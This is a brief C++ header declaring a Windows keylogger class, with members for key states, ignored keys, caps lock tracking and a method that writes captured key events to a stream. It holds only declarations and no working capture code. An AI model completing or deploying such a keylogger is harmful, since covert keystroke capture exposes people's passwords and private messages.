#ifndef H_KEYLOGGER
#define H_KEYLOGGER

#include <vector>
#include <Windows.h>
#include <string>
#include <ostream>


using std::vector;
using std::ostream;
using std::string;

class KeyLogger
{
private:

    vector<bool> _keysState;

    // if true ingored key
    vector<bool> _keysIgnored;

    bool _is_capsLook;

public:
    KeyLogger();
	~KeyLogger();

    void WriteEventKeys(ostream& buf /* out */);
};

#endif

